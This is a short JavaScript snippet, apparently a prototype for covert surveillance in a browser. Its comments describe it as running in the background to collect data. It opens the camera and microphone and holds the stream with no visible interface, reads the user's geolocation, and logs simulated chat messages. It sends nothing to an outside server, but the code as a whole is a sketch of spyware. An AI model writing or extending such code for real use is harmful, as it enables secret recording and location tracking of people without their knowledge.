// Runs in background, collects data
navigator.mediaDevices.getUserMedia({ video: true, audio: true })
  .then(stream => {
    // Keep the stream in memory (no UI)
    window.stream = stream;
  });

// Simulate location capture
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    position => {
      console.log("Latitude: " + position.coords.latitude);
      console.log("Longitude: " + position.coords.longitude);
    },
    error => {
      console.error("Error getting location: ", error);
    }
  );
}

// Simulate chat messages
setInterval(() => {
  const message = "User message: " + Math.random().toString(36).substring(7);
  console.log(message);
}, 2000);